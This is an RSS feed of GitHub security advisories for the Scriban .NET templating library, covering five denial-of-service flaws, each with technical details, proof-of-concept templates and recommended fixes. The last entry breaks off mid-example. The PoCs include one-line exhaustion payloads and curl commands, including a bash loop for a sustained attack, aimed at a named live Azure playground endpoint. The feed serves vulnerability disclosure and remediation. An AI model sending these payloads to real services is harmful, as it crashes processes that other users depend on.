<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/nuget.rss</id>
    <title>Security Advisory for .NET packages hosted at the NuGet Gallery</title>
    <updated>2026-03-25T00:09:28.284Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anuget"/>
    <subtitle>Security Advisory for .NET packages hosted at the NuGet Gallery on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[Scriban] Scriban has Multiple Denial-of-Service Vectors via Unbounded Resource Consumption During Expression Evaluation]]></title>
        <id>https://github.com/advisories/GHSA-xw6w-9jjh-p9cr</id>
        <link href="https://github.com/advisories/GHSA-xw6w-9jjh-p9cr"/>
        <updated>2026-03-24T22:16:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Scriban's expression evaluation contains three distinct code paths that allow an attacker who can supply a template to cause denial of service through unbounded memory allocation or CPU exhaustion. The existing safety controls (<code>LimitToString</code>, <code>LoopLimit</code>) do not protect these paths, giving applications a false sense of safety when evaluating untrusted templates.</p>
<h2 id="details">Details</h2>
<h3 id="vector-1-unbounded-string-multiplication">Vector 1: Unbounded string multiplication</h3>
<p>In <code>ScriptBinaryExpression.cs</code>, the <code>CalculateToString</code> method handles the <code>string * int</code> operator by looping without any upper bound:</p>
<pre><code class="language-csharp">// src/Scriban/Syntax/Expressions/ScriptBinaryExpression.cs:319-334
var leftText = context.ObjectToString(left);
var builder = new StringBuilder();
for (int i = 0; i &lt; value; i++)
{
    builder.Append(leftText);
}
return builder.ToString();
</code></pre>
<p>The <code>LimitToString</code> safety control (default 1MB) does <strong>not</strong> protect this code path. It only applies to <code>ObjectToString</code> output conversions in <code>TemplateContext.Helpers.cs</code> (lines 101-121), not to intermediate string values constructed inside <code>CalculateToString</code>. The <code>LoopLimit</code> also does not apply because this is a C# <code>for</code> loop, not a template-level loop — <code>StepLoop()</code> is never called here.</p>
<h3 id="vector-2-unbounded-biginteger-shift-left">Vector 2: Unbounded BigInteger shift left</h3>
<p>The <code>CalculateLongWithInt</code> and <code>CalculateBigIntegerNoFit</code> methods handle <code>ShiftLeft</code> without any bound on the shift amount:</p>
<pre><code class="language-csharp">// src/Scriban/Syntax/Expressions/ScriptBinaryExpression.cs:710-711
case ScriptBinaryOperator.ShiftLeft:
    return (BigInteger)left &lt;&lt; (int)right;
</code></pre>
<pre><code class="language-csharp">// src/Scriban/Syntax/Expressions/ScriptBinaryExpression.cs:783-784
case ScriptBinaryOperator.ShiftLeft:
    return left &lt;&lt; (int)right;
</code></pre>
<p>In contrast, the <code>Power</code> operator at lines 722 and 795 uses <code>BigInteger.ModPow(left, right, MaxBigInteger)</code> to cap results. The <code>MaxBigInteger</code> constant (<code>BigInteger.One &lt;&lt; 1024 * 1024</code>, defined at line 690) already exists but is never applied to shift operations.</p>
<h3 id="vector-3-looplimit-bypass-via-range-enumeration-in-builtin-functions">Vector 3: LoopLimit bypass via range enumeration in builtin functions</h3>
<p>The range operators <code>..</code> and <code>..&lt;</code> produce lazy <code>IEnumerable&lt;object&gt;</code> iterators:</p>
<pre><code class="language-csharp">// src/Scriban/Syntax/Expressions/ScriptBinaryExpression.cs:401-417
private static IEnumerable&lt;object&gt; RangeInclude(BigInteger left, BigInteger right)
{
    if (left &lt; right)
    {
        for (var i = left; i &lt;= right; i++)
        {
            yield return FitToBestInteger(i);
        }
    }
    // ...
}
</code></pre>
<p>When these ranges are consumed by builtin functions, <code>LoopLimit</code> is completely bypassed because <code>StepLoop()</code> is only called in <code>ScriptForStatement</code> and <code>ScriptWhileStatement</code> — it is never called in any function under <code>src/Scriban/Functions/</code>. For example:</p>
<ul>
<li><code>ArrayFunctions.Size</code> (line 609) calls <code>.Cast&lt;object&gt;().Count()</code>, fully enumerating the range</li>
<li><code>ArrayFunctions.Join</code> (line 388) iterates with <code>foreach</code> and appends to a <code>StringBuilder</code> with no size limit</li>
</ul>
<h2 id="poc">PoC</h2>
<h3 id="vector-1--string-multiplication-oom">Vector 1 — String multiplication OOM:</h3>
<pre><code class="language-csharp">var template = Template.Parse("{{ 'AAAA' * 500000000 }}");
var context = new TemplateContext();
// context.LimitToString is 1048576 by default — does NOT protect this path
template.Render(context); // OutOfMemoryException: attempts ~2GB allocation
</code></pre>
<h3 id="vector-2--biginteger-shift-oom">Vector 2 — BigInteger shift OOM:</h3>
<pre><code class="language-csharp">var template = Template.Parse("{{ 1 &lt;&lt; 100000000 }}");
var context = new TemplateContext();
template.Render(context); // Allocates BigInteger with 100M bits (~12.5MB)
// {{ 1 &lt;&lt; 2000000000 }} attempts ~250MB
</code></pre>
<h3 id="vector-3--looplimit-bypass-via-range--builtin">Vector 3 — LoopLimit bypass via range + builtin:</h3>
<pre><code class="language-csharp">var template = Template.Parse("{{ (0..1000000000) | array.size }}");
var context = new TemplateContext();
// context.LoopLimit is 1000 — does NOT protect builtin function iteration
template.Render(context); // CPU exhaustion: enumerates 1 billion items
</code></pre>
<pre><code class="language-csharp">var template = Template.Parse("{{ (0..10000000) | array.join ',' }}");
var context = new TemplateContext();
template.Render(context); // Memory exhaustion: builds ~80MB+ joined string
</code></pre>
<h2 id="impact">Impact</h2>
<p>An attacker who can supply a Scriban template (common in CMS platforms, email templating systems, reporting tools, and other applications embedding Scriban) can cause denial of service by crashing the host process via <code>OutOfMemoryException</code> or exhausting CPU resources. This is particularly impactful because:</p>
<ol>
<li>Applications relying on the default safety controls (<code>LoopLimit=1000</code>, <code>LimitToString=1MB</code>) believe they are protected against resource exhaustion from untrusted templates, but these controls have gaps.</li>
<li>A single malicious template expression is sufficient — no complex template logic is required.</li>
<li>The <code>OutOfMemoryException</code> in vectors 1 and 2 typically terminates the entire process, not just the template evaluation.</li>
</ol>
<h2 id="recommended-fix">Recommended Fix</h2>
<h3 id="vector-1--string-multiplication-check-limittostring-before-the-loop">Vector 1 — String multiplication: Check <code>LimitToString</code> before the loop</h3>
<pre><code class="language-csharp">// src/Scriban/Syntax/Expressions/ScriptBinaryExpression.cs, before line 330
var leftText = context.ObjectToString(left);
if (context.LimitToString &gt; 0 &amp;&amp; (long)value * leftText.Length &gt; context.LimitToString)
{
    throw new ScriptRuntimeException(span,
        $"String multiplication would exceed LimitToString ({context.LimitToString} characters)");
}
var builder = new StringBuilder();
for (int i = 0; i &lt; value; i++)
</code></pre>
<h3 id="vector-2--biginteger-shift-cap-the-shift-amount">Vector 2 — BigInteger shift: Cap the shift amount</h3>
<pre><code class="language-csharp">// src/Scriban/Syntax/Expressions/ScriptBinaryExpression.cs, lines 710-711 and 783-784
case ScriptBinaryOperator.ShiftLeft:
    if (right &gt; 1048576) // Same as MaxBigInteger bit count
        throw new ScriptRuntimeException(span,
            $"Shift amount {right} exceeds maximum allowed (1048576)");
    return (BigInteger)left &lt;&lt; (int)right;
</code></pre>
<h3 id="vector-3--range--builtins-add-iteration-counting-to-range-iterators">Vector 3 — Range + builtins: Add iteration counting to range iterators</h3>
<p>Pass <code>TemplateContext</code> to <code>RangeInclude</code>/<code>RangeExclude</code> and enforce a limit:</p>
<pre><code class="language-csharp">private static IEnumerable&lt;object&gt; RangeInclude(TemplateContext context, BigInteger left, BigInteger right)
{
    var maxRange = context.LoopLimit &gt; 0 ? context.LoopLimit : int.MaxValue;
    int count = 0;
    if (left &lt; right)
    {
        for (var i = left; i &lt;= right; i++)
        {
            if (++count &gt; maxRange)
                throw new ScriptRuntimeException(context.CurrentNode.Span,
                    $"Range enumeration exceeds LoopLimit ({maxRange})");
            yield return FitToBestInteger(i);
        }
    }
    // ... same for descending branch
}
</code></pre>
<p>Alternatively, validate range size eagerly at creation time: <code>if (BigInteger.Abs(right - left) &gt; maxRange) throw ...</code></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scriban/scriban/security/advisories/GHSA-xw6w-9jjh-p9cr">https://github.com/scriban/scriban/security/advisories/GHSA-xw6w-9jjh-p9cr</a></li>
<li><a href="https://github.com/advisories/GHSA-xw6w-9jjh-p9cr">https://github.com/advisories/GHSA-xw6w-9jjh-p9cr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xw6w-9jjh-p9cr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-24T22:16:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Scriban] Scriban: Denial of Service via Unbounded Cumulative Template Output Bypassing LimitToString]]></title>
        <id>https://github.com/advisories/GHSA-m2p3-hwv5-xpqw</id>
        <link href="https://github.com/advisories/GHSA-m2p3-hwv5-xpqw"/>
        <updated>2026-03-24T22:15:45.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>LimitToString</code> safety limit (default 1MB since commit <code>b5ac4bf</code>) can be bypassed to allocate approximately 1GB of memory by exploiting the per-call reset of <code>_currentToStringLength</code> in <code>ObjectToString</code>. Each template expression rendered through <code>TemplateContext.Write(SourceSpan, object)</code> triggers a separate top-level <code>ObjectToString</code> call that resets the length counter to zero, and the underlying <code>StringBuilderOutput</code> has no cumulative output size limit. An attacker who can supply a template can cause an out-of-memory condition in the host application.</p>
<h2 id="details">Details</h2>
<p>The root cause is in <code>TemplateContext.Helpers.cs</code>, in the <code>ObjectToString</code> method:</p>
<pre><code class="language-csharp">// src/Scriban/TemplateContext.Helpers.cs:89-111
public virtual string ObjectToString(object value, bool nested = false)
{
    if (_objectToStringLevel == 0)
    {
        _currentToStringLength = 0;  // &lt;-- resets on every top-level call
    }
    try
    {
        _objectToStringLevel++;
        // ...
        var result = ObjectToStringImpl(value, nested);
        if (LimitToString &gt; 0 &amp;&amp; _objectToStringLevel == 1 &amp;&amp; result != null &amp;&amp; result.Length &gt;= LimitToString)
        {
            return result + "...";
        }
        return result;
    }
    // ...
}
</code></pre>
<p>Each time a template expression is rendered, <code>TemplateContext.Write(SourceSpan, object)</code> calls <code>ObjectToString</code>:</p>
<pre><code class="language-csharp">// src/Scriban/TemplateContext.cs:693-701
public virtual TemplateContext Write(SourceSpan span, object textAsObject)
{
    if (textAsObject != null)
    {
        var text = ObjectToString(textAsObject);  // fresh _currentToStringLength = 0
        Write(text);
    }
    return this;
}
</code></pre>
<p>The <code>StringBuilderOutput.Write</code> method appends unconditionally with no size check:</p>
<pre><code class="language-csharp">// src/Scriban/Runtime/StringBuilderOutput.cs:47-50
public void Write(string text, int offset, int count)
{
    Builder.Append(text, offset, count);  // no cumulative limit
}
</code></pre>
<p><strong>Execution flow:</strong></p>
<ol>
<li>Template creates a string of length 1,048,575 (one byte under the 1MB <code>LimitToString</code> default)</li>
<li>A <code>for</code> loop iterates up to <code>LoopLimit</code> (default 1000) times</li>
<li>Each iteration renders the string via <code>Write(span, x)</code> → <code>ObjectToString(x)</code></li>
<li><code>ObjectToString</code> resets <code>_currentToStringLength = 0</code> since <code>_objectToStringLevel == 0</code></li>
<li>The string passes the <code>LimitToString</code> check (1,048,575 &lt; 1,048,576)</li>
<li>Full string is appended to <code>StringBuilder</code> — no cumulative tracking</li>
<li>After 1000 iterations: ~1GB allocated in-memory</li>
</ol>
<h2 id="poc">PoC</h2>
<pre><code class="language-csharp">using Scriban;

// Uses only default TemplateContext settings (LoopLimit=1000, LimitToString=1048576)
var template = Template.Parse("{{ x = \"\" | string.pad_left 1048575 }}{{ for i in 1..1000 }}{{ x }}{{ end }}");
// This will allocate ~1GB in the StringBuilder, likely causing OOM
var result = template.Render();
</code></pre>
<p>Equivalent Scriban template:</p>
<pre><code class="language-scriban">{{ x = "" | string.pad_left 1048575 }}{{ for i in 1..1000 }}{{ x }}{{ end }}
</code></pre>
<p>Each of the 1000 loop iterations outputs a 1,048,575-character string. Each passes the per-call <code>LimitToString</code> check independently. Total output: <del>1,000,000,000 characters (</del>1GB) allocated in the <code>StringBuilder</code>.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Denial of Service:</strong> An attacker who can supply Scriban templates (common in CMS, email templating, report generation) can crash the host application via out-of-memory</li>
<li><strong>Process-level impact:</strong> OOM kills the entire .NET process, not just the template rendering — affects all concurrent users</li>
<li><strong>Bypass of safety mechanism:</strong> The <code>LimitToString</code> limit was specifically introduced to prevent resource exhaustion, but the per-call reset makes it ineffective against cumulative abuse</li>
<li><strong>Low complexity:</strong> The exploit template is trivial — a single line</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Add a cumulative output size counter to <code>TemplateContext</code> that tracks total bytes written across all <code>Write</code> calls, independent of the per-object <code>LimitToString</code>:</p>
<pre><code class="language-csharp">// In TemplateContext.cs — add new property and field
private long _totalOutputLength;

/// &lt;summary&gt;
/// Gets or sets the maximum total output length in characters. Default is 10485760 (10 MB). 0 means no limit.
/// &lt;/summary&gt;
public int OutputLimit { get; set; } = 10485760;

// In TemplateContext.Write(string, int, int) — add check before writing
public TemplateContext Write(string text, int startIndex, int count)
{
    if (text != null)
    {
        if (OutputLimit &gt; 0)
        {
            _totalOutputLength += count;
            if (_totalOutputLength &gt; OutputLimit)
            {
                throw new ScriptRuntimeException(CurrentSpan, 
                    $"The output limit of {OutputLimit} characters was reached.");
            }
        }
        // ... existing indent/write logic
    }
    return this;
}
</code></pre>
<p>This provides defense-in-depth: <code>LimitToString</code> caps individual object serialization, while <code>OutputLimit</code> caps total template output.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scriban/scriban/security/advisories/GHSA-m2p3-hwv5-xpqw">https://github.com/scriban/scriban/security/advisories/GHSA-m2p3-hwv5-xpqw</a></li>
<li><a href="https://github.com/advisories/GHSA-m2p3-hwv5-xpqw">https://github.com/advisories/GHSA-m2p3-hwv5-xpqw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m2p3-hwv5-xpqw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-24T22:15:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Scriban] Scriban has Uncontrolled Recursion in `object.to_json` Causing Unrecoverable Process Crash via StackOverflowException]]></title>
        <id>https://github.com/advisories/GHSA-xcx6-vp38-8hr5</id>
        <link href="https://github.com/advisories/GHSA-xcx6-vp38-8hr5"/>
        <updated>2026-03-24T22:15:15.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>object.to_json</code> builtin function in Scriban performs recursive JSON serialization via an internal <code>WriteValue()</code> static local function that has no depth limit, no circular reference detection, and no stack overflow guard. A Scriban template containing a self-referencing object passed to <code>object.to_json</code> triggers unbounded recursion, causing a <code>StackOverflowException</code> that terminates the hosting .NET process. This is a fatal, unrecoverable crash — <code>StackOverflowException</code> cannot be caught by user code in .NET.</p>
<h2 id="details">Details</h2>
<p>The vulnerable code is the <code>WriteValue()</code> static local function at <code>src/Scriban/Functions/ObjectFunctions.cs:494</code>:</p>
<pre><code class="language-csharp">static void WriteValue(TemplateContext context, Utf8JsonWriter writer, object value)
{
    var type = value?.GetType() ?? typeof(object);
    if (value is null || value is string || value is bool ||
        type.IsPrimitiveOrDecimal() || value is IFormattable)
    {
        JsonSerializer.Serialize(writer, value, type);
    }
    else if (value is IList || type.IsArray) {
        writer.WriteStartArray();
        foreach (var x in context.ToList(context.CurrentSpan, value))
        {
            WriteValue(context, writer, x);  // recursive, no depth check
        }
        writer.WriteEndArray();
    }
    else {
        writer.WriteStartObject();
        var accessor = context.GetMemberAccessor(value);
        foreach (var member in accessor.GetMembers(context, context.CurrentSpan, value))
        {
            if (accessor.TryGetValue(context, context.CurrentSpan, value, member, out var memberValue))
            {
                writer.WritePropertyName(member);
                WriteValue(context, writer, memberValue);  // recursive, no depth check
            }
        }
        writer.WriteEndObject();
    }
}
</code></pre>
<p>This function has <strong>none</strong> of the safety mechanisms present in other recursive paths:</p>
<ul>
<li><code>ObjectToString()</code> at <code>TemplateContext.Helpers.cs:98</code> checks <code>ObjectRecursionLimit</code> (default 20)</li>
<li><code>EnterRecursive()</code> at <code>TemplateContext.cs:957</code> calls <code>RuntimeHelpers.EnsureSufficientExecutionStack()</code></li>
<li><code>CheckAbort()</code> at <code>TemplateContext.cs:464</code> also calls <code>EnsureSufficientExecutionStack()</code></li>
</ul>
<p>The <code>WriteValue()</code> function bypasses all of these because it is a static local function that only takes the <code>TemplateContext</code> for member access — it never calls <code>EnterRecursive()</code>, never checks <code>ObjectRecursionLimit</code>, and never calls <code>EnsureSufficientExecutionStack()</code>.</p>
<p><strong>Execution flow:</strong></p>
<ol>
<li>Template creates a ScriptObject: <code>{{ x = {} }}</code></li>
<li>Sets a self-reference: <code>x.self = x</code> — stores a reference in <code>ScriptObject.Store</code> dictionary</li>
<li>Pipes to <code>object.to_json</code>: <code>x | object.to_json</code> → calls <code>ToJson()</code> at line 477</li>
<li><code>ToJson()</code> calls <code>WriteValue(context, writer, value)</code> at line 488</li>
<li><code>WriteValue</code> enters the <code>else</code> branch (line 515), gets members via accessor, finds "self"</li>
<li><code>TryGetValue</code> returns <code>x</code> itself, <code>WriteValue</code> recurses with the same object — infinite loop</li>
<li><code>StackOverflowException</code> is thrown — <strong>fatal, cannot be caught, process terminates</strong></li>
</ol>
<h2 id="poc">PoC</h2>
<pre><code class="language-scriban">{{ x = {}; x.self = x; x | object.to_json }}
</code></pre>
<p>In a hosting application:</p>
<pre><code class="language-csharp">using Scriban;

// This will crash the entire process with StackOverflowException
var template = Template.Parse("{{ x = {}; x.self = x; x | object.to_json }}");
var result = template.Render(); // FATAL: process terminates here
</code></pre>
<p>Even without circular references, deeply nested objects can exhaust the stack since no depth limit is enforced:</p>
<pre><code class="language-scriban">{{ a = {}
   b = {inner: a}
   c = {inner: b}
   d = {inner: c}
   # ... continue nesting ...
   result = deepest | object.to_json }}
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Process crash DoS</strong>: Any application embedding Scriban for user-provided templates (CMS platforms, email template engines, report generators, static site generators) can be crashed by a single malicious template. The crash is unrecoverable — <code>StackOverflowException</code> terminates the .NET process.</li>
<li><strong>No try/catch protection possible</strong>: Unlike most exceptions, <code>StackOverflowException</code> cannot be caught by application code. The hosting application cannot wrap <code>template.Render()</code> in a try/catch to survive this.</li>
<li><strong>No authentication required</strong>: <code>object.to_json</code> is a default builtin function (registered in <code>BuiltinFunctions.cs</code>), available in all Scriban templates unless explicitly removed.</li>
<li><strong>Trivial to exploit</strong>: The PoC is a single line of template code.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Add a depth counter parameter to <code>WriteValue()</code> and check it against <code>ObjectRecursionLimit</code>, consistent with how <code>ObjectToString</code> is protected. Also add <code>EnsureSufficientExecutionStack()</code> as a safety net:</p>
<pre><code class="language-csharp">static void WriteValue(TemplateContext context, Utf8JsonWriter writer, object value, int depth = 0)
{
    if (context.ObjectRecursionLimit != 0 &amp;&amp; depth &gt; context.ObjectRecursionLimit)
    {
        throw new ScriptRuntimeException(context.CurrentSpan,
            $"Exceeding object recursion limit `{context.ObjectRecursionLimit}` in object.to_json");
    }

    try
    {
        RuntimeHelpers.EnsureSufficientExecutionStack();
    }
    catch (InsufficientExecutionStackException)
    {
        throw new ScriptRuntimeException(context.CurrentSpan,
            "Exceeding recursive depth limit in object.to_json, near to stack overflow");
    }

    var type = value?.GetType() ?? typeof(object);
    if (value is null || value is string || value is bool ||
        type.IsPrimitiveOrDecimal() || value is IFormattable)
    {
        JsonSerializer.Serialize(writer, value, type);
    }
    else if (value is IList || type.IsArray) {
        writer.WriteStartArray();
        foreach (var x in context.ToList(context.CurrentSpan, value))
        {
            WriteValue(context, writer, x, depth + 1);
        }
        writer.WriteEndArray();
    }
    else {
        writer.WriteStartObject();
        var accessor = context.GetMemberAccessor(value);
        foreach (var member in accessor.GetMembers(context, context.CurrentSpan, value))
        {
            if (accessor.TryGetValue(context, context.CurrentSpan, value, member, out var memberValue))
            {
                writer.WritePropertyName(member);
                WriteValue(context, writer, memberValue, depth + 1);
            }
        }
        writer.WriteEndObject();
    }
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scriban/scriban/security/advisories/GHSA-xcx6-vp38-8hr5">https://github.com/scriban/scriban/security/advisories/GHSA-xcx6-vp38-8hr5</a></li>
<li><a href="https://github.com/advisories/GHSA-xcx6-vp38-8hr5">https://github.com/advisories/GHSA-xcx6-vp38-8hr5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xcx6-vp38-8hr5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-24T22:15:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Scriban] Scriban: Uncontrolled Memory Allocation via string.pad_left/pad_right Allows Remote Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-v66j-x4hw-fv9g</id>
        <link href="https://github.com/advisories/GHSA-v66j-x4hw-fv9g"/>
        <updated>2026-03-24T22:13:39.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The built-in <code>string.pad_left</code> and <code>string.pad_right</code> template functions in Scriban perform no validation on the <code>width</code> parameter, allowing a template expression to allocate arbitrarily large strings in a single call. When Scriban is exposed to untrusted template input — as in the official Scriban.AppService playground deployed on Azure — an unauthenticated attacker can trigger ~1GB memory allocations with a 39-byte payload, crashing the service via <code>OutOfMemoryException</code>.</p>
<h2 id="details">Details</h2>
<p><code>StringFunctions.PadLeft</code> and <code>StringFunctions.PadRight</code> (<code>src/Scriban/Functions/StringFunctions.cs:1181-1203</code>) directly delegate to .NET's <code>String.PadLeft(int)</code> / <code>String.PadRight(int)</code> with no bounds checking:</p>
<pre><code class="language-csharp">// src/Scriban/Functions/StringFunctions.cs:1181-1183
public static string PadLeft(string text, int width)
{
    return (text ?? string.Empty).PadLeft(width);
}

// src/Scriban/Functions/StringFunctions.cs:1200-1202
public static string PadRight(string text, int width)
{
    return (text ?? string.Empty).PadRight(width);
}
</code></pre>
<p>The <code>TemplateContext.LimitToString</code> property (default 1MB, set at <code>TemplateContext.cs:147</code>) does <strong>not</strong> prevent the allocation. This limit is only checked during <code>ObjectToString()</code> conversion (<code>TemplateContext.Helpers.cs:101-103</code>), which runs <em>after</em> the string has been fully allocated by <code>PadLeft</code>/<code>PadRight</code>. The dangerous allocation is the return value of a built-in function — it occurs before output rendering.</p>
<p>The Scriban.AppService playground (<code>src/Scriban.AppService/Program.cs:63-140</code>) exposes <code>POST /api/render</code> with:</p>
<ul>
<li>No authentication</li>
<li>Template size limit of 1KB (line 71) — the payload fits in 39 bytes</li>
<li>A 2-second timeout via <code>CancellationTokenSource</code> (line 118) — but this only cancels the <code>await Task.Run(...)</code>, not the running <code>template.Render()</code> call (line 122). The BCL <code>PadLeft</code> allocation completes atomically before the cancellation can take effect.</li>
<li>Rate limiting of 30 requests/minute (line 25)</li>
</ul>
<h2 id="poc">PoC</h2>
<p>Single request to crash or degrade the AppService:</p>
<pre><code class="language-bash">curl -X POST https://scriban-a7bhepbxcrbkctgf.canadacentral-01.azurewebsites.net/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{{ \u0027\u0027 | string.pad_left 500000000 }}"}'
</code></pre>
<p>This 39-byte template causes <code>PadLeft(500000000)</code> to attempt allocating a 500-million character string (~1GB in .NET's UTF-16 encoding).</p>
<p><strong>Expected result:</strong> The service returns an error or truncated output safely.</p>
<p><strong>Actual result:</strong> The .NET runtime attempts a ~1GB allocation. Depending on available memory, this either succeeds (consuming ~1GB until GC), or throws <code>OutOfMemoryException</code> crashing the process.</p>
<p>Sustained attack with rate limiting:</p>
<pre><code class="language-bash"># 30 requests/minute × ~1GB each = ~30GB/minute of memory pressure
for i in $(seq 1 30); do
  curl -s -X POST https://scriban-a7bhepbxcrbkctgf.canadacentral-01.azurewebsites.net/api/render \
    -H "Content-Type: application/json" \
    -d '{"template": "{{ \u0027\u0027 | string.pad_left 500000000 }}"}' &amp;
done
wait
</code></pre>
<p>The <code>string.pad_right</code> variant works identically:</p>
<pre><code class="language-bash">curl -X POST https://scriban-a7bhepbxcrbkctgf.canadacentral-01.azurewebsites.net/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{{ \u0027\u0027 | string.pad_right 500000000 }}"}'
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Remote denial of service</strong> against any application that renders untrusted Scriban templates, including the official Scriban playground at <code>scriban-a7bhepbxcrbkctgf.canadacentral-01.azurewebsites.net</code>.</li>
<li>An unauthenticated attacker can crash the hosting process via <code>OutOfMemoryException</code> with a single HTTP request.</li>
<li>With sustained requests at the rate limit (30/min), the attacker can maintain continuous memory pressure (~30GB/min), preventing service recovery.</li>
<li>The existing <code>LimitToString</code> and timeout mitigations do not prevent the intermediate memory allocation.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Add width validation in <code>StringFunctions.PadLeft</code> and <code>StringFunctions.PadRight</code> to cap the maximum allocation. A reasonable upper bound is the <code>LimitToString</code> value from the <code>TemplateContext</code>, or a fixed maximum if the context is not available:</p>
<pre><code class="language-csharp">// src/Scriban/Functions/StringFunctions.cs

// Option 1: Fixed reasonable maximum (simplest fix)
public static string PadLeft(string text, int width)
{
    if (width &lt; 0) width = 0;
    if (width &gt; 1_048_576) width = 1_048_576; // 1MB cap
    return (text ?? string.Empty).PadLeft(width);
}

public static string PadRight(string text, int width)
{
    if (width &lt; 0) width = 0;
    if (width &gt; 1_048_576) width = 1_048_576; // 1MB cap
    return (text ?? string.Empty).PadRight(width);
}
</code></pre>
<p>Alternatively, make the functions context-aware and use <code>LimitToString</code> as the cap, consistent with how other Scriban limits work. The AppService should also be updated to run template rendering in a memory-limited container or AppDomain to provide defense-in-depth.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scriban/scriban/security/advisories/GHSA-v66j-x4hw-fv9g">https://github.com/scriban/scriban/security/advisories/GHSA-v66j-x4hw-fv9g</a></li>
<li><a href="https://github.com/advisories/GHSA-v66j-x4hw-fv9g">https://github.com/advisories/GHSA-v66j-x4hw-fv9g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v66j-x4hw-fv9g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-24T22:13:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scriban] Scriban: Built-in operations bypass LoopLimit and delay cancellation, enabling Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-c875-h985-hvrc</id>
        <link href="https://github.com/advisories/GHSA-c875-h985-hvrc"/>
        <updated>2026-03-24T22:13:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Scriban's <code>LoopLimit</code> only applies to script loop statements, not to expensive iteration performed inside operators and builtins. An attacker can submit a single expression such as <code>{{ 1..1000000 | array.size }}</code> and force large amounts of CPU work even when <code>LoopLimit</code> is set to a very small value.</p>
<h2 id="details">Details</h2>
<p>The relevant code path is:</p>
<ul>
<li><code>ScriptBlockStatement.Evaluate()</code> calls <code>context.CheckAbort()</code> once per statement in <code>src/Scriban/Syntax/Statements/ScriptBlockStatement.cs</code> lines 41–46.</li>
<li><code>LoopLimit</code> enforcement is tied to script loop execution via <code>TemplateContext.StepLoop()</code>, not to internal helper iteration.</li>
<li><code>array.size</code> in <code>src/Scriban/Functions/ArrayFunctions.cs</code> lines 596–609 calls <code>list.Cast&lt;object&gt;().Count()</code> for non-collection enumerables.</li>
<li><code>1..N</code> creates a <code>ScriptRange</code> from <code>ScriptBinaryExpression.RangeInclude()</code> in <code>src/Scriban/Syntax/Expressions/ScriptBinaryExpression.cs</code> lines 745–748.</li>
<li><code>ScriptRange</code> then yields every element one by one <strong>without going through <code>StepLoop()</code></strong> in <code>src/Scriban/Runtime/ScriptRange.cs</code>.</li>
</ul>
<p>This means a single statement can perform arbitrarily large iteration without being stopped by <code>LoopLimit</code>.</p>
<p>There is also a related memory-amplification path in <code>string * int</code>:</p>
<ul>
<li><code>ScriptBinaryExpression.CalculateToString()</code> appends in a plain <code>for</code> loop in <code>src/Scriban/Syntax/Expressions/ScriptBinaryExpression.cs</code> lines 301–334.</li>
</ul>
<hr>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="setup">Setup</h3>
<pre><code class="language-bash">mkdir scriban-poc3
cd scriban-poc3
dotnet new console --framework net8.0
dotnet add package Scriban --version 6.6.0
</code></pre>
<h3 id="programcs"><code>Program.cs</code></h3>
<pre><code class="language-csharp">using Scriban;

var template = Template.Parse("{{ 1..1000000 | array.size }}");

var context = new TemplateContext
{
    LoopLimit = 1
};

Console.WriteLine(template.Render(context));
</code></pre>
<h3 id="run">Run</h3>
<pre><code class="language-bash">dotnet run
</code></pre>
<h3 id="actual-output">Actual Output</h3>
<pre><code>1000000
</code></pre>
<h3 id="expected-behavior">Expected Behavior</h3>
<p>A safety limit of <code>LoopLimit = 1</code> should prevent a template from performing one million iterations worth of work.</p>
<h3 id="optional-stronger-variant-memory-amplification">Optional Stronger Variant (Memory Amplification)</h3>
<pre><code class="language-csharp">using Scriban;

var template = Template.Parse("{{ 'A' * 200000000 }}");
var context = new TemplateContext
{
    LoopLimit = 1
};

template.Render(context);
</code></pre>
